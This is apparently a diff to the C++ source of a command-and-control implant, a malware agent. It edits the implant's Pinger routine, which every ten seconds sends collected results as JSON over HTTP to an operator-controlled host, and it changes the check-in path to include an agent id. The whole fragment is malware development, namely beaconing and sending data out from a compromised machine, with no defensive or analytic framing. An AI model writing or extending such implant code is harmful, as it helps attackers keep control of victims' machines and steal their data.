@@ -13,7 +13,6 @@
 #include <algorithm>
 
 #include <cpr/cpr.h>
-#include <boost/uuid/uuid_io.hpp>
 #include <boost/property_tree/ptree.hpp>
 #include <boost/property_tree/json_parser.hpp>
 #include <boost/asio/ip/host_name.hpp>
@@ -302,9 +301,9 @@ void Implant::Pinger() {
             // Parsing to json format
             boost::property_tree::write_json(resultsStringStream, resultsLocal);
 
-
+            std::string url = "/ping/" + ids;
             std::this_thread::sleep_for(std::chrono::seconds{ 10 });
-            if (sendHttpRequest(host, port, "/ping", resultsStringStream.str()) == "0") { setRunning(false); };
+            if (sendHttpRequest(host, port, url, resultsStringStream.str()) == "0") { setRunning(false); };
         }
         else {
             std::this_thread::sleep_for(std::chrono::seconds{ 10 });
